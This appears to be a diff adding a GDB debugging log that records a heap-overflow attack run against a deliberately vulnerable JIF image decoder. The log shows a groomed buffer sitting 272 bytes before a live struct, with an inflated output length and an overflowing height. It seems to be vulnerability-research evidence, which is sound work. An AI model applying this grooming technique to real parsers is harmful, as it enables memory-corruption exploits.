@@ -1,0 +1,15 @@
+$ gdb -q -batch -ex 'set pagination off' -ex 'break jif-vulnerable.inc:106' -ex 'run attack 4d' -ex 'printf "PIN next_out=%p avail_out=%u total_out=%lu\n", zs.next_out, zs.avail_out, (unsigned long) zs.total_out' -ex 'frame 1' -ex 'printf "MAIN groom=%p live_struct=%p delta=%ld\n", groom, live, (long) ((char *) live - (char *) groom)' -ex 'bt 3' ./evidence/real-vuln
+Breakpoint 1 at 0x1804: file ../pins/jif-vulnerable.inc, line 106.
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+LAYOUT groom=0x55555555f450 usable=264
+LAYOUT live_struct=0x55555555f560 live_data=0x55555555f590 delta=272
+
+Breakpoint 1, ReadJeffsImage (fd=0x0, dest=0x7fffffffc0f0 "", bpp=8 '\b', len=2, height=1073741889, alpha_frame=1, image=0x7fffffffbf88, error=0x7fffffffbf90) at ../pins/jif-vulnerable.inc:106
+106	  ret = inflate (&zs, Z_NO_FLUSH);
+PIN next_out=0x55555555f450 avail_out=2147483778 total_out=0
+#1  0x0000555555555fcc in main (argc=3, argv=0x7fffffffe238) at real-driver.c:156
+156	  rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha, &image, &error);
+MAIN groom=0x55555555f450 live_struct=0x55555555f560 delta=272
+#0  ReadJeffsImage (fd=0x0, dest=0x7fffffffc0f0 "", bpp=8 '\b', len=2, height=1073741889, alpha_frame=1, image=0x7fffffffbf88, error=0x7fffffffbf90) at ../pins/jif-vulnerable.inc:106
+#1  0x0000555555555fcc in main (argc=3, argv=0x7fffffffe238) at real-driver.c:156
